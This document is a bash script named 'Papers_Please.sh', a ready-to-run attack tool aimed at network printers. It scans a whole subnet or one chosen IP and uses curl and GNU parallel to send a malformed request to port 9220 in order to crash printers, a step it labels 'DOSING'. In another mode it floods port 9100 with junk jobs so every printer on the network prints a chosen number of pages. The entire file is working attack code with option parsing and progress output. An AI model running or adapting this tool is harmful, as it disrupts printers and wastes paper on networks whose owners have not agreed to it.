#!/usr/bin/env bash

#Global variables
###################
RED='\e[0;31m'
GREEN='\e[0;32m'
YELLOW='\e[1;33m'
NC='\e[0m'
####################

function help(){
cat << EOF
./Papers_Please.sh [OPTION]
OPTION:			    DESCRIPTION:
-t, --target={IP}	    Specify a specific
			    target rather than
		     	    all addresses on
			    the network.

-n, --network={IP/CIDR}     Manually specify the
			    network address for
			    the current network
			    you are on.

--papyrus={N}	    	    Number of jobs to
			    send to the printer
			    this should cause
			    the printer to print
			    N number of pages.

-i, --interval={N}  	    The interval before
			    another job is sent
			    to the printer. Where
			    N can be a decimal
			    i.e. 0.1 or a whole
			    number. The default
			    interval is 1.

-j, --jobs={-N|+N|N%|N}     Number of jobs to
			    run. Passes value
			    to parallel.
			    Defaults to 0.

-p, --proc={-N|+N|N%|N}	    Define the maximum
			    N of processes that
			    can be active at a
			    time. Defaults to
			    1.

-s, --slots={-N|+N|N%|N}    The amount of
			    'slots' available
			    to be used by
			    parallel for jobs.
			    Default is 0 which
			    means to create as
			    many as possible
			    while respecting
			    security limits
			    such as ones found in
			    /etc/security/limits.conf

--no-check		    Will skip dependency
			    checking.

-q, --quiet		    Suppress output to
			    terminal. Only the
			    progress bar from
			    parallel will be
			    printed to the
			    terminal in this
			    mode.

-v, --version		    Print version
			    information
			    then exit.

-h, --help		    Print this
			    dialog page.
EOF
exit $1
}

options=$(getopt -o t:n:i:j:p:s:qvh -l target:,network:,papyrus:,interval:,jobs:,proc:,slots:,no-check,quiet,version,help -n "$0" -- "$@") || help '1'
eval set -- "$options"

while [[ $1 != -- ]]
do
	case $1 in
	-t|--target)     target=$2 ; shift 2 				  		  ;;
	-n|--network)    networkRoute=$2 ; shift 2					  ;;
	--papyrus)	 printRequests=$2 ; shift 2					  ;;
	-i|--interval)   interval=$2 ; shift 2						  ;;
	-j|--jobs)	 jobs=$2 ; shift 2				  		  ;;
	-p|--proc)	 processes=$2 ; shift 2 				          ;;
	-s|--slots)	 slots=$2 ; shift 2				  		  ;;
	--no-check)      dependencyCheck='False' ; shift 1                                ;;
	-q|--quiet)	 quietOutput='/dev/null' ; shift 1			 	  ;;
	-v|--version)    printf 'Version: 4.5.1 - Binary Jam\n' ; exit 0 ; shift 1 	  ;;
	-h|--help)       help '0' ; shift 1 				  		  ;;
	*)               printf 'Invalid Option\n' ; help '1' 		  		  ;;
	esac
done

if [ -z $target ] && [ -z $jobs ]
then
	jobs='0'
fi
if [ -z $target ] && [ -z $processes ]
then
	processes='1'
fi
if [ -z $target ] && [ -z $slots ]
then
	slots='0'
fi
if [ -z $interval ]
then
	interval='1'
fi
if [ ! -z $printRequests ]
then
	port='9100'
else
	port='9220'
fi

function output(){

function checkDependencies(){
	dependencies=(curl parallel sed grep awk ip)
	for check in ${dependencies[@]}
	do
		if [ -z `which $check` ]
		then
			printf "[%bFAIL%b] Package %s is NOT installed. Exiting\n" $RED $NC $check
			exitWhenDone='True'
		else
			printf "[%bOK%b]   Package %s is installed\n" $GREEN $NC $check
		fi
	done
	if [ ! -z $exitWhenDone ]
	then
		exit 1
	fi
}
if [ -z $dependencyCheck ]
then
	checkDependencies
fi

function attackSpecifiedTarget(){
	if [[ $(grep -Ex "(([0-9]){1,3}\.){3}([0-9]){1,3}" <<< $target || printf '1' ) == '1' ]]
	then
		printf "[%bFAIL%b] Not a valid IP address. Exiting\n" $RED $NC
		exit 1
	fi
	if [ ! -z $target ] && [[ $(nc -w 1 -z $target $port && printf '0') == '0' ]]
	then
		if [ ! -z $printRequests ]
		then
			printf "[%bINFO%b] Sending %s print requrests to %s\n" $YELLOW $NC $printRequests $target
			counter=1
			for i in `seq $printRequests`
			do
				curl -A 'null' $target:$port -m $interval --silent --output /dev/null -X 'Foo Bar'
				echo -n "Progress: $(bc <<< "scale=4;($counter/$printRequests)*100")%, Request: $counter/$printRequests" $'\r'
				counter=$(($counter+1))
			done
		else
			printf "[%bINFO%b] DOSING printer at socket: %s\n" $YELLOW $NC $target
			curl -A 'null' $target:$port -m $interval --silent --output /dev/null -X 'open 999999999'
			if [[ $(nc -w 3 -z $target $port && printf '0') == '0' ]]
			then
				printf "[%bFAIL%b] Remote host is still up\n" $RED $NC
				exit 1
			else
				printf "[%bOK%b]   Remote host is down\n" $GREEN $NC
			fi
		fi
	else
		printf "[%bFAIL%b] Port on remote host is not open\n" $RED $NC
		exit 1
	fi
	exit 0
}
if [ ! -z $target ]
then
	attackSpecifiedTarget
fi

function NETWORKING(){
	if [[ -z $networkRoute ]]
	then
		local networkRoute=$(awk '/([0-9].*\.){3}([0-9].*){1,3}\/([0-9].){1,2} dev wlan0/' <<< "$(ip route show)")
		if [[ -z $networkRoute ]]
		then
			printf "[%bFAIL%b] Could not discover network address.\n       Try manually specifying a network address\n       using the -n|--network flag.\n" $RED $NC
			exit 1
		fi
	else
		if [ $(grep -Ex "(([0-9]){1,3}\.){3}([0-9]){1,3}\/([0-9]){1,2}" <<< $networkRoute || printf '1') == '1' ]
		then
			printf "[%bFAIL%b] Invalid network address. Exiting\n" $RED $NC
			exit 1
		fi
	fi

	local NETWORKADDR=($(grep -Eo ".*\/" <<< "$networkRoute" | sed -E 's/\///;s/\./ /g'))
        local CIDR=$(grep -Eo "\/([0-9]){1,2}" <<< "$networkRoute" | sed 's/\///')
        local HOSTS=$((2**(32-$CIDR)-2))

        printf "[%bINFO%b] Need to scan: %s hosts\n" $YELLOW $NC $HOSTS
	printf "[%bINFO%b] Starting address expansion for network: %s\n" $YELLOW $NC $networkRoute

        addr=${NETWORKADDR[3]}
        addrRange=()
        for i in `seq 0 $HOSTS`
        do
                NETWORKADDR[3]=$addr
                if [ ${NETWORKADDR[3]} == '256' ]
                then
                        NETWORKADDR[2]=$((${NETWORKADDR[2]}+1))
                        NETWORKADDR[3]='0'
                        addr=0
                fi
                if [ ${NETWORKADDR[2]} == '256' ]
                then
                        NETWORKADDR[1]=$((${NETWORKADDR[1]}+1))
                        NETWORKADDR[2]='0'
                fi
                addr=$((addr+1))

                a=${NETWORKADDR[@]}
                addrRange+=(${a// /\.})
        done
	printf "[%bINFO%b] Completed address expansion for network: %s\n" $YELLOW $NC $networkRoute
}
NETWORKING

if [ ! -d tmp/ ]
then
        printf "[%bINFO%b] The tmp/ directory does not exist. Creating it\n" $YELLOW $NC
        mkdir $PWD/tmp
else
	printf "[%bINFO%b] The tmp/ directory already exists.\n" $YELLOW $NC
	doNotRemoveTmp='True'
fi

function cleanup(){
	if [ $1 == 'break' ]
	then
		printf '\nInterrupt detected. Exiting\n'
	else
		printf "[%bINFO%b] Attack complete\n" $YELLOW $NC
	fi

	if [ -z $doNotRemoveTmp ]
	then
		rm -rf tmp/
	else
		rm -f tmp/addressRanges.txt
	fi
	exit 0
}

for i in ${addrRange[@]}
do
        echo $i >> tmp/addressRanges.txt
done

trap "cleanup break" SIGHUP SIGINT SIGQUIT
if [ -z $printRequests ]
then
	parallel --bar -k --jobs $jobs --max-procs $processes -P $slots curl -A 'null' {}:9220 --silent -m $interval --output /dev/null -X 'open\ 99999999' :::: tmp/addressRanges.txt
else
	parallel --bar -k --jobs $jobs --max-procs $processes -P $slots curl -A 'null' {1}:9100 --silent -m $interval --output /dev/null -X 'foo\ bar' :::: tmp/addressRanges.txt :::: <(seq $printRequests)
fi
cleanup 'end'
}
if [ -z $quietOutput ]
then
        output
else
	output >$quietOutput
fi
